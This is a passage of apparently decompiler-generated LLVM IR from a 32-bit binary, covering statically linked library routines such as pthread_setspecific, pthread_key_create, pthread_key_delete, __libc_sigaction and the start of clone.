  %v0_805a396 = phi i32 [ %v0_805a36732, %dec_label_pc_805a359 ], [ %v0_805a396.pre, %dec_label_pc_805a37b ]
  %v1_805a396 = add i32 %v0_805a396, 1
  store i32 %v1_805a396, i32* @edi, align 4
  %v7_805a39a = icmp sgt i32 %v1_805a396, 31
  br i1 %v7_805a39a, label %dec_label_pc_805a39c, label %dec_label_pc_805a396.dec_label_pc_805a359_crit_edge

dec_label_pc_805a396.dec_label_pc_805a359_crit_edge: ; preds = %dec_label_pc_805a396
  %v1_805a36e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a359

dec_label_pc_805a39c:                             ; preds = %dec_label_pc_805a396, %dec_label_pc_805a34b
  %v0_805a39c = phi i32 [ %v0_805a39c.pre31, %dec_label_pc_805a34b ], [ %v0_805a39c.pre, %dec_label_pc_805a396 ]
  %v1_805a39c = add i32 %v0_805a39c, 1
  store i32 %v1_805a39c, i32* @ebx, align 4
  %v7_805a3a0 = icmp sgt i32 %v1_805a39c, 31
  br i1 %v7_805a3a0, label %dec_label_pc_805a3a2, label %dec_label_pc_805a39c.dec_label_pc_805a34b_crit_edge

dec_label_pc_805a39c.dec_label_pc_805a34b_crit_edge: ; preds = %dec_label_pc_805a39c
  %v0_805a34d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a34b

dec_label_pc_805a3a2:                             ; preds = %dec_label_pc_805a39c
  %v0_805a3a2 = load i32, i32* @ebp, align 4
  %v1_805a3a2 = add i32 %v0_805a3a2, 1
  store i32 %v1_805a3a2, i32* @ebp, align 4
  %v0_805a3bb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a3bb

dec_label_pc_805a3af:                             ; preds = %dec_label_pc_805a3aa.lr.ph
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805a34b

dec_label_pc_805a3bb:                             ; preds = %dec_label_pc_805a3a2, %dec_label_pc_805a3aa.lr.ph
  %v0_805a3bb = phi i32 [ %v1_805a33a, %dec_label_pc_805a3aa.lr.ph ], [ %v0_805a3bb.pre, %dec_label_pc_805a3a2 ]
  %stack_var_-20.1 = phi i32 [ 1, %dec_label_pc_805a3aa.lr.ph ], [ 0, %dec_label_pc_805a3a2 ]
  %v1_805a3bb = add i32 %v0_805a3bb, 28
  %v2_805a3bb = inttoptr i32 %v1_805a3bb to i32*
  %v3_805a3bb = load i32, i32* %v2_805a3bb, align 4
  store i32 %v3_805a3bb, i32* @eax, align 4
  store i32 %v0_805a3bb, i32* @edx, align 4
  %v1_805a3c0 = call i32 @__pthread_lock(i32 %stack_var_-20.1)
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805a3c9

dec_label_pc_805a3c9:                             ; preds = %dec_label_pc_805a3bb, %dec_label_pc_805a3eb
  %v1_805a3c930 = phi i32 [ 0, %dec_label_pc_805a3bb ], [ %v1_805a3eb, %dec_label_pc_805a3eb ]
  %v0_805a3c9 = load i32, i32* @esi, align 4
  %v2_805a3c9 = mul i32 %v1_805a3c930, 4
  %v3_805a3c9 = add i32 %v2_805a3c9, 236
  %v4_805a3c9 = add i32 %v3_805a3c9, %v0_805a3c9
  %v5_805a3c9 = inttoptr i32 %v4_805a3c9 to i32*
  %v6_805a3c9 = load i32, i32* %v5_805a3c9, align 4
  %v1_805a3d0 = icmp eq i32 %v6_805a3c9, 0
  br i1 %v1_805a3d0, label %dec_label_pc_805a3eb, label %dec_label_pc_805a3d4

dec_label_pc_805a3d4:                             ; preds = %dec_label_pc_805a3c9
  %v1_805a3d8 = call i32 @free(i32 %v6_805a3c9)
  %v0_805a3dd = load i32, i32* @esi, align 4
  %v1_805a3dd = load i32, i32* @ebx, align 4
  %v2_805a3dd = mul i32 %v1_805a3dd, 4
  %v3_805a3dd = add i32 %v0_805a3dd, 236
  %v4_805a3dd = add i32 %v3_805a3dd, %v2_805a3dd
  %v5_805a3dd = inttoptr i32 %v4_805a3dd to i32*
  store i32 0, i32* %v5_805a3dd, align 4
  %v0_805a3eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805a3eb

dec_label_pc_805a3eb:                             ; preds = %dec_label_pc_805a3c9, %dec_label_pc_805a3d4
  %v0_805a3eb = phi i32 [ %v1_805a3c930, %dec_label_pc_805a3c9 ], [ %v0_805a3eb.pre, %dec_label_pc_805a3d4 ]
  %v1_805a3eb = add i32 %v0_805a3eb, 1
  store i32 %v1_805a3eb, i32* @ebx, align 4
  %v7_805a3ef = icmp sgt i32 %v1_805a3eb, 31
  br i1 %v7_805a3ef, label %dec_label_pc_805a3f1, label %dec_label_pc_805a3c9

dec_label_pc_805a3f1:                             ; preds = %dec_label_pc_805a3eb
  %v0_805a3f4 = load i32, i32* @esi, align 4
  %v1_805a3f4 = add i32 %v0_805a3f4, 28
  %v2_805a3f4 = inttoptr i32 %v1_805a3f4 to i32*
  %v3_805a3f4 = load i32, i32* %v2_805a3f4, align 4
  %v1_805a3f7 = inttoptr i32 %v3_805a3f4 to i32*
  %v2_805a3f7 = call i32 @__pthread_unlock(i32* %v1_805a3f7)
  store i32 %stack_var_-20.1, i32* @ebx, align 4
  store i32 %v0_805a334, i32* @esi, align 4
  store i32 %v0_805a333, i32* @edi, align 4
  store i32 %v0_805a332, i32* @ebp, align 4
  ret i32 %v2_805a3f7

; uselistorder directives
  uselistorder i32 %v1_805a3eb, { 1, 0, 2 }
  uselistorder i32 %v1_805a3c930, { 1, 0 }
  uselistorder i32 %stack_var_-20.1, { 1, 0 }
  uselistorder i32 %v0_805a3bb, { 1, 0 }
  uselistorder i32 %v1_805a39c, { 1, 0, 2 }
  uselistorder i32 %v1_805a396, { 0, 2, 1 }
  uselistorder i32 %v4_805a360, { 1, 0 }
  uselistorder i32 %v0_805a36732, { 1, 0, 2 }
  uselistorder i32 %v0_805a39c.pre33, { 1, 2, 0 }
  uselistorder i32 %v0_805a39c.pre31, { 1, 0, 2 }
  uselistorder i32 %v1_805a3aa, { 1, 0 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 42, 50, 7, 8, 9, 10, 43, 44, 46, 47, 48, 49, 3, 45, 11, 38, 12, 13, 4, 37, 39, 14, 15, 16, 17, 18, 19, 20, 21, 36, 40, 41, 22, 23, 24, 25, 26, 27, 28, 30, 31, 5, 32, 29, 33, 0, 1, 2, 35, 34, 6 }
  uselistorder i32 (i32)* @__pthread_lock, { 6, 1, 0, 29, 28, 27, 5, 3, 2, 33, 4, 26, 9, 25, 24, 32, 10, 8, 23, 22, 21, 11, 7, 20, 19, 18, 16, 31, 15, 17, 14, 35, 34, 12, 13, 30 }
  uselistorder label %dec_label_pc_805a3eb, { 1, 0 }
  uselistorder label %dec_label_pc_805a3c9, { 1, 0 }
  uselistorder label %dec_label_pc_805a396, { 1, 0 }
  uselistorder label %dec_label_pc_805a34b, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805a406 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_805a411 = icmp ugt i32 %arg1, 1023
  br i1 %v6_805a411, label %dec_label_pc_805a468, label %dec_label_pc_805a413

dec_label_pc_805a413:                             ; preds = %entry
  %v1_805a413 = mul i32 %arg1, 8
  %v2_805a413 = add i32 %v1_805a413, ptrtoint (i32* @global_var_8078ec0.680 to i32)
  %v3_805a413 = inttoptr i32 %v2_805a413 to i32*
  %v4_805a413 = load i32, i32* %v3_805a413, align 8
  %v5_805a413 = icmp eq i32 %v4_805a413, 0
  br i1 %v5_805a413, label %dec_label_pc_805a468, label %dec_label_pc_805a41d

dec_label_pc_805a41d:                             ; preds = %dec_label_pc_805a413
  %v1_805a41d = call i32 @thread_self.19(i32 %v0_805a406)
  %v0_805a422 = load i32, i32* @ebx, align 4
  %v2_805a424 = udiv i32 %v0_805a422, 32
  store i32 %v2_805a424, i32* @esi, align 4
  store i32 %v1_805a41d, i32* @edi, align 4
  %v2_805a429 = mul nuw nsw i32 %v2_805a424, 4
  %v3_805a429 = add i32 %v1_805a41d, 236
  %v4_805a429 = add i32 %v3_805a429, %v2_805a429
  %v5_805a429 = inttoptr i32 %v4_805a429 to i32*
  %v6_805a429 = load i32, i32* %v5_805a429, align 4
  %v7_805a429 = icmp eq i32 %v6_805a429, 0
  %v1_805a431 = icmp eq i1 %v7_805a429, false
  br i1 %v1_805a431, label %dec_label_pc_805a453, label %dec_label_pc_805a433

dec_label_pc_805a433:                             ; preds = %dec_label_pc_805a41d
  %v5_805a439 = call i32 @calloc(i64 32, i32 4, i32 %v1_805a41d, i32 %v1_805a41d)
  %v1_805a448 = icmp eq i32 %v5_805a439, 0
  br i1 %v1_805a448, label %dec_label_pc_805a46d, label %dec_label_pc_805a44c

dec_label_pc_805a44c:                             ; preds = %dec_label_pc_805a433
  %v1_805a44c = load i32, i32* @edi, align 4
  %v2_805a44c = load i32, i32* @esi, align 4
  %v3_805a44c = mul i32 %v2_805a44c, 4
  %v4_805a44c = add i32 %v1_805a44c, 236
  %v5_805a44c = add i32 %v4_805a44c, %v3_805a44c
  %v6_805a44c = inttoptr i32 %v5_805a44c to i32*
  store i32 %v5_805a439, i32* %v6_805a44c, align 4
  %v0_805a453.pre = load i32, i32* @ebx, align 4
  %v0_805a456.pre = load i32, i32* @edi, align 4
  %v1_805a456.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805a453

dec_label_pc_805a453:                             ; preds = %dec_label_pc_805a41d, %dec_label_pc_805a44c
  %v1_805a456 = phi i32 [ %v2_805a424, %dec_label_pc_805a41d ], [ %v1_805a456.pre, %dec_label_pc_805a44c ]
  %v0_805a456 = phi i32 [ %v1_805a41d, %dec_label_pc_805a41d ], [ %v0_805a456.pre, %dec_label_pc_805a44c ]
  %v0_805a453 = phi i32 [ %v0_805a422, %dec_label_pc_805a41d ], [ %v0_805a453.pre, %dec_label_pc_805a44c ]
  %v1_805a453 = urem i32 %v0_805a453, 32
  %v2_805a456 = mul i32 %v1_805a456, 4
  %v3_805a456 = add i32 %v0_805a456, 236
  %v4_805a456 = add i32 %v3_805a456, %v2_805a456
  %v5_805a456 = inttoptr i32 %v4_805a456 to i32*
  %v6_805a456 = load i32, i32* %v5_805a456, align 4
  %v3_805a461 = mul nuw nsw i32 %v1_805a453, 4
  %v4_805a461 = add i32 %v3_805a461, %v6_805a456
  %v5_805a461 = inttoptr i32 %v4_805a461 to i32*
  store i32 %arg2, i32* %v5_805a461, align 4
  br label %dec_label_pc_805a46d

dec_label_pc_805a468:                             ; preds = %dec_label_pc_805a413, %entry
  br label %dec_label_pc_805a46d

dec_label_pc_805a46d:                             ; preds = %dec_label_pc_805a433, %dec_label_pc_805a453, %dec_label_pc_805a468
  %v0_805a470 = phi i32 [ 12, %dec_label_pc_805a433 ], [ 0, %dec_label_pc_805a453 ], [ 22, %dec_label_pc_805a468 ]
  ret i32 %v0_805a470

; uselistorder directives
  uselistorder i32 %v5_805a439, { 1, 0 }
  uselistorder i32 %v2_805a424, { 2, 1, 0 }
  uselistorder i32 %v0_805a422, { 1, 0 }
  uselistorder i32 %v1_805a41d, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_805a46d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805a453, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807aec0.682 to i32), i32* %stack_var_-28, align 4
  %v1_805a47f = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  %v0_805a487 = load i32, i32* @ebx, align 4
  %v6_805a48d = icmp ugt i32 %v0_805a487, 1023
  br i1 %v6_805a48d, label %dec_label_pc_805a499, label %dec_label_pc_805a48f

dec_label_pc_805a48f:                             ; preds = %entry
  %v1_805a48f = mul i32 %v0_805a487, 8
  %v2_805a48f = add i32 %v1_805a48f, ptrtoint (i32* @global_var_8078ec0.680 to i32)
  %v3_805a48f = inttoptr i32 %v2_805a48f to i32*
  %v4_805a48f = load i32, i32* %v3_805a48f, align 8
  %v5_805a48f = icmp eq i32 %v4_805a48f, 0
  %v1_805a497 = icmp eq i1 %v5_805a48f, false
  br i1 %v1_805a497, label %dec_label_pc_805a4ad, label %dec_label_pc_805a499

dec_label_pc_805a499:                             ; preds = %dec_label_pc_805a48f, %entry
  store i32 ptrtoint (i32* @global_var_807aec0.682 to i32), i32* %stack_var_-28, align 4
  %v1_805a4a1 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  br label %dec_label_pc_805a508

dec_label_pc_805a4ad:                             ; preds = %dec_label_pc_805a48f
  store i32 0, i32* %v3_805a48f, align 8
  %v0_805a4b8 = load i32, i32* @ebx, align 4
  %v1_805a4b8 = mul i32 %v0_805a4b8, 8
  %v2_805a4b8 = add i32 %v1_805a4b8, ptrtoint (i32* @global_var_8078ec4.681 to i32)
  %v3_805a4b8 = inttoptr i32 %v2_805a4b8 to i32*
  store i32 0, i32* %v3_805a4b8, align 4
  %v0_805a4c3 = load i32, i32* @global_var_8074524.624, align 4
  %v10_805a4c3 = icmp eq i32 %v0_805a4c3, -1
  br i1 %v10_805a4c3, label %dec_label_pc_805a4f9, label %dec_label_pc_805a4cc

dec_label_pc_805a4cc:                             ; preds = %dec_label_pc_805a4ad
  %v0_805a4cc = load i32, i32* %stack_var_-28, align 4
  %v1_805a4cc = call i32 @thread_self.19(i32 %v0_805a4cc)
  %v0_805a4d1 = load i32, i32* @ebx, align 4
  %v2_805a4d3 = udiv i32 %v0_805a4d1, 32
  store i32 %v2_805a4d3, i32* @esi, align 4
  %v1_805a4d6 = urem i32 %v0_805a4d1, 32
  store i32 %v1_805a4d6, i32* @ebx, align 4
  store i32 %v1_805a4cc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805a4db

dec_label_pc_805a4db:                             ; preds = %dec_label_pc_805a4f3, %dec_label_pc_805a4cc
  %v0_805a4e1 = phi i32 [ %v2_805a4f3, %dec_label_pc_805a4f3 ], [ %v1_805a4cc, %dec_label_pc_805a4cc ]
  %v1_805a4db = add i32 %v0_805a4e1, 44
  %v2_805a4db = inttoptr i32 %v1_805a4db to i8*
  %v3_805a4db = load i8, i8* %v2_805a4db, align 1
  %v4_805a4db = icmp eq i8 %v3_805a4db, 0
  %v1_805a4df = icmp eq i1 %v4_805a4db, false
  br i1 %v1_805a4df, label %dec_label_pc_805a4f3, label %dec_label_pc_805a4e1

dec_label_pc_805a4e1:                             ; preds = %dec_label_pc_805a4db
  %v1_805a4e1 = load i32, i32* @esi, align 4
  %v2_805a4e1 = mul i32 %v1_805a4e1, 4
  %v3_805a4e1 = add i32 %v0_805a4e1, 236
  %v4_805a4e1 = add i32 %v3_805a4e1, %v2_805a4e1
  %v5_805a4e1 = inttoptr i32 %v4_805a4e1 to i32*
  %v6_805a4e1 = load i32, i32* %v5_805a4e1, align 4
  %v1_805a4e8 = icmp eq i32 %v6_805a4e1, 0
  br i1 %v1_805a4e8, label %dec_label_pc_805a4f3, label %dec_label_pc_805a4ec

dec_label_pc_805a4ec:                             ; preds = %dec_label_pc_805a4e1
  %v1_805a4ec = load i32, i32* @ebx, align 4
  %v2_805a4ec = mul i32 %v1_805a4ec, 4
  %v3_805a4ec = add i32 %v2_805a4ec, %v6_805a4e1
  %v4_805a4ec = inttoptr i32 %v3_805a4ec to i32*
  store i32 0, i32* %v4_805a4ec, align 4
  %v0_805a4f3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805a4f3

dec_label_pc_805a4f3:                             ; preds = %dec_label_pc_805a4e1, %dec_label_pc_805a4db, %dec_label_pc_805a4ec
  %v0_805a4f3 = phi i32 [ %v0_805a4e1, %dec_label_pc_805a4e1 ], [ %v0_805a4e1, %dec_label_pc_805a4db ], [ %v0_805a4f3.pre, %dec_label_pc_805a4ec ]
  %v1_805a4f3 = inttoptr i32 %v0_805a4f3 to i32*
  %v2_805a4f3 = load i32, i32* %v1_805a4f3, align 4
  store i32 %v2_805a4f3, i32* %edx.global-to-local, align 4
  %v12_805a4f5 = icmp eq i32 %v2_805a4f3, %v1_805a4cc
  %v1_805a4f7 = icmp eq i1 %v12_805a4f5, false
  br i1 %v1_805a4f7, label %dec_label_pc_805a4db, label %dec_label_pc_805a4f9

dec_label_pc_805a4f9:                             ; preds = %dec_label_pc_805a4f3, %dec_label_pc_805a4ad
  store i32 ptrtoint (i32* @global_var_807aec0.682 to i32), i32* %stack_var_-28, align 4
  %v1_805a501 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  br label %dec_label_pc_805a508

dec_label_pc_805a508:                             ; preds = %dec_label_pc_805a499, %dec_label_pc_805a4f9
  %storemerge = phi i32 [ 22, %dec_label_pc_805a499 ], [ 0, %dec_label_pc_805a4f9 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_805a4f3, { 0, 2, 1 }
  uselistorder i32 %v0_805a4d1, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 236, { 0, 1, 2, 3, 5, 6, 7, 8, 4 }
  uselistorder i32 (i32)* @thread_self.19, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder i32* @global_var_8074524.624, { 2, 3, 4, 0, 5, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_805a508, { 1, 0 }
  uselistorder label %dec_label_pc_805a4f3, { 2, 0, 1 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ebx, align 4
  %v1_805a519 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  store i32 %v1_805a519, i32* %eax.global-to-local, align 4
  %v0_805a55b.pr = load i32, i32* @ebx, align 4
  %v7_805a56110 = icmp sgt i32 %v0_805a55b.pr, 1023
  br i1 %v7_805a56110, label %dec_label_pc_805a563, label %dec_label_pc_805a523

dec_label_pc_805a523:                             ; preds = %entry, %dec_label_pc_805a55a
  %v0_805a55a11 = phi i32 [ %v1_805a55a, %dec_label_pc_805a55a ], [ %v0_805a55b.pr, %entry ]
  %v1_805a523 = mul i32 %v0_805a55a11, 8
  %v2_805a523 = add i32 %v1_805a523, ptrtoint (i32* @global_var_8078ec0.680 to i32)
  %v3_805a523 = inttoptr i32 %v2_805a523 to i32*
  %v4_805a523 = load i32, i32* %v3_805a523, align 8
  %v5_805a523 = icmp eq i32 %v4_805a523, 0
  %v1_805a52b = icmp eq i1 %v5_805a523, false
  br i1 %v1_805a52b, label %dec_label_pc_805a55a, label %dec_label_pc_805a52d

dec_label_pc_805a52d:                             ; preds = %dec_label_pc_805a523
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v3_805a523, align 8
  %v0_805a53f = load i32, i32* %eax.global-to-local, align 4
  %v1_805a53f = load i32, i32* @ebx, align 4
  %v2_805a53f = mul i32 %v1_805a53f, 8
  %v3_805a53f = add i32 %v2_805a53f, ptrtoint (i32* @global_var_8078ec4.681 to i32)
  %v4_805a53f = inttoptr i32 %v3_805a53f to i32*
  store i32 %v0_805a53f, i32* %v4_805a53f, align 4
  %v1_805a54b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v0_805a554 = load i32, i32* @ebx, align 4
  store i32 %v0_805a554, i32* %arg1, align 4
  br label %dec_label_pc_805a575

dec_label_pc_805a55a:                             ; preds = %dec_label_pc_805a523
  %v1_805a55a = add nsw i32 %v0_805a55a11, 1
  store i32 %v1_805a55a, i32* @ebx, align 4
  %v7_805a561 = icmp sgt i32 %v0_805a55a11, 1022
  br i1 %v7_805a561, label %dec_label_pc_805a563, label %dec_label_pc_805a523

dec_label_pc_805a563:                             ; preds = %dec_label_pc_805a55a, %entry
  %v1_805a56b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807aec0.682 to i32))
  br label %dec_label_pc_805a575

dec_label_pc_805a575:                             ; preds = %dec_label_pc_805a52d, %dec_label_pc_805a563
  %storemerge = phi i32 [ 11, %dec_label_pc_805a563 ], [ 0, %dec_label_pc_805a52d ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805a55a, { 1, 0 }
  uselistorder i32 %v0_805a55a11, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_807aec0.682 to i32), { 1, 0, 2, 3, 6, 4, 7, 5, 8 }
  uselistorder label %dec_label_pc_805a575, { 1, 0 }
  uselistorder label %dec_label_pc_805a523, { 1, 0 }
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_805a57c:
  %v0_805a581 = load i32, i32* @ebx, align 4
  %v1_805a581 = inttoptr i32 %v0_805a581 to %sigcontext*
  %v2_805a581 = call i32 @sigreturn(%sigcontext* %v1_805a581)
  %v0_805a589 = load i32, i32* @ebx, align 4
  %v1_805a589 = inttoptr i32 %v0_805a589 to %sigcontext*
  %v2_805a589 = call i32 @sigreturn(%sigcontext* %v1_805a589)
  ret i32 %v2_805a589
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805a58b = load i32, i32* @esi, align 4
  %v0_805a58c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805a5a1 = icmp eq i32* %arg2, null
  br i1 %v1_805a5a1, label %dec_label_pc_805a5f4, label %dec_label_pc_805a5a5

dec_label_pc_805a5a5:                             ; preds = %entry
  %v2_805a5a5 = load i32, i32* %arg2, align 4
  store i32 %v2_805a5a5, i32* %stack_var_-148, align 4
  %v1_805a5ae = add i32 %tmp11, 4
  %v3_805a5c0 = bitcast i32* %stack_var_-136 to i16*
  %v4_805a5c0 = call i32 @memcpy(i16* %v3_805a5c0, i32 %v1_805a5ae, i32 128)
  %v1_805a5c5 = add i32 %tmp11, 132
  %v2_805a5df = inttoptr i32 %v1_805a5c5 to i8*
  %v3_805a5df = load i8, i8* %v2_805a5df, align 1
  %v4_805a5df = and i8 %v3_805a5df, 4
  %v5_805a5df = icmp eq i8 %v4_805a5df, 0
  %v1_805a5e6 = icmp eq i1 %v5_805a5df, false
  br i1 %v1_805a5e6, label %dec_label_pc_805a5f4, label %dec_label_pc_805a5e8

dec_label_pc_805a5e8:                             ; preds = %dec_label_pc_805a5a5
  br label %dec_label_pc_805a5f4

dec_label_pc_805a5f4:                             ; preds = %dec_label_pc_805a5e8, %dec_label_pc_805a5a5, %entry
  %v1_805a5f6 = icmp eq i32 %arg3, 0
  br i1 %v1_805a5f6, label %dec_label_pc_805a5fe, label %dec_label_pc_805a5fa

dec_label_pc_805a5fa:                             ; preds = %dec_label_pc_805a5f4
  %v2_805a5fa = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805a5fe

dec_label_pc_805a5fe:                             ; preds = %dec_label_pc_805a5f4, %dec_label_pc_805a5fa
  %v0_805a60d = phi i32 [ 0, %dec_label_pc_805a5f4 ], [ %v2_805a5fa, %dec_label_pc_805a5fa ]
  br i1 %v1_805a5a1, label %dec_label_pc_805a60b, label %dec_label_pc_805a604

dec_label_pc_805a604:                             ; preds = %dec_label_pc_805a5fe
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805a60b

dec_label_pc_805a60b:                             ; preds = %dec_label_pc_805a5fe, %dec_label_pc_805a604
  %v0_805a60e = phi %sigaction* [ null, %dec_label_pc_805a5fe ], [ %phitmp, %dec_label_pc_805a604 ]
  %v5_805a616 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_805a60e, i32 %v0_805a60d, i32 8)
  store i32 %v5_805a616, i32* %ebx.global-to-local, align 4
  br i1 %v1_805a5f6, label %dec_label_pc_805a659, label %dec_label_pc_805a624

dec_label_pc_805a624:                             ; preds = %dec_label_pc_805a60b
  %v2_805a624 = icmp slt i32 %v5_805a616, 0
  br i1 %v2_805a624, label %dec_label_pc_805a659, label %dec_label_pc_805a628

dec_label_pc_805a628:                             ; preds = %dec_label_pc_805a624
  %v3_805a628 = load i32, i32* %stack_var_-288, align 4
  %v2_805a62c = inttoptr i32 %arg3 to i32*
  store i32 %v3_805a628, i32* %v2_805a62c, align 4
  %v2_805a634 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805a639 = add i32 %arg3, 4
  %v3_805a63d = inttoptr i32 %v1_805a639 to i16*
  %v4_805a63d = call i32 @memcpy(i16* %v3_805a63d, i32 %v2_805a634, i32 128)
  %v2_805a646 = add i32 %arg3, 132
  %v3_805a646 = inttoptr i32 %v2_805a646 to i32*
  %v2_805a653 = add i32 %arg3, 136
  %v3_805a653 = inttoptr i32 %v2_805a653 to i32*
  %v0_805a659.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a659

dec_label_pc_805a659:                             ; preds = %dec_label_pc_805a624, %dec_label_pc_805a60b, %dec_label_pc_805a628
  %v0_805a659 = phi i32 [ %v5_805a616, %dec_label_pc_805a624 ], [ %v5_805a616, %dec_label_pc_805a60b ], [ %v0_805a659.pre, %dec_label_pc_805a628 ]
  store i32 %v0_805a58c, i32* @ebx, align 4
  store i32 %v0_805a58b, i32* @esi, align 4
  ret i32 %v0_805a659

; uselistorder directives
  uselistorder i32 %v5_805a616, { 0, 1, 3, 2 }
  uselistorder i1 %v1_805a5f6, { 1, 0 }
  uselistorder i1 %v1_805a5a1, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_805a659, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805a60b, { 1, 0 }
  uselistorder label %dec_label_pc_805a5fe, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 -22, i32* @eax, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805a66d = icmp eq i32 %arg1, 0
  br i1 %v1_805a66d, label %dec_label_pc_805a6cb, label %dec_label_pc_805a671

dec_label_pc_805a671:                             ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v1_805a675 = icmp eq i32 %arg2, 0
  br i1 %v1_805a675, label %dec_label_pc_805a6cb, label %dec_label_pc_805a679

dec_label_pc_805a679:                             ; preds = %dec_label_pc_805a671
  %v1_805a679 = and i32 %arg2, -16
  %v1_805a67c = add i32 %v1_805a679, -28
  store i32 %v1_805a67c, i32* %ecx.global-to-local, align 4
  %v2_805a683 = add i32 %v1_805a679, -16
  %v3_805a683 = inttoptr i32 %v2_805a683 to i32*
  store i32 %arg4, i32* %v3_805a683, align 16
  %v1_805a68a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805a68a = add i32 %v1_805a68a, 8
  %v3_805a68a = inttoptr i32 %v2_805a68a to i32*
  store i32 %arg1, i32* %v3_805a68a, align 4
  %v0_805a68d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a68d = add i32 %v0_805a68d, 4
  %v2_805a68d = inttoptr i32 %v1_805a68d to i32*
  store i32 0, i32* %v2_805a68d, align 4
  %v0_805a694 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805a694 = inttoptr i32 %v0_805a694 to i32*
  store i32 0, i32* %v1_805a694, align 4
  %v0_805a69a = load i32, i32* @ebx, align 4
  store i32 %v0_805a69a, i32* %stack_var_-4, align 4
  %v0_805a69b = load i32, i32* @esi, align 4
  %v0_805a69c = load i32, i32* @edi, align 4
  store i32 %v0_805a69c, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805a6b2 = load i32, i32* %stack_var_0, align 4
  %v4_805a6b2 = call i32 @clone(i32 %v0_805a69c, i32 %v0_805a69b, i32 %v0_805a69a, i32 %v3_805a6b2)
  store i32 %v4_805a6b2, i32* @eax, align 4
  %v2_805a6b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a6b4, i32* @edi, align 4
  store i32 %v0_805a69b, i32* @esi, align 4
  %v2_805a6b6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a6b6, i32* @ebx, align 4
  %v2_805a6b7 = icmp slt i32 %v4_805a6b2, 0
  %v2_805a6b9 = icmp eq i1 %v2_805a6b7, false
  br i1 %v2_805a6b9, label %dec_label_pc_805a6bb, label %dec_label_pc_805a6cb

dec_label_pc_805a6bb:                             ; preds = %dec_label_pc_805a679
  %v1_805a6b7 = icmp eq i32 %v4_805a6b2, 0
  br i1 %v1_805a6b7, label %dec_label_pc_805a6be, label %dec_label_pc_805a6bd

dec_label_pc_805a6bd:                             ; preds = %dec_label_pc_805a6bb
  ret i32 %v4_805a6b2

dec_label_pc_805a6be:                             ; preds = %dec_label_pc_805a6bb
  store i32 %v0_805a69b, i32* @ebp, align 4
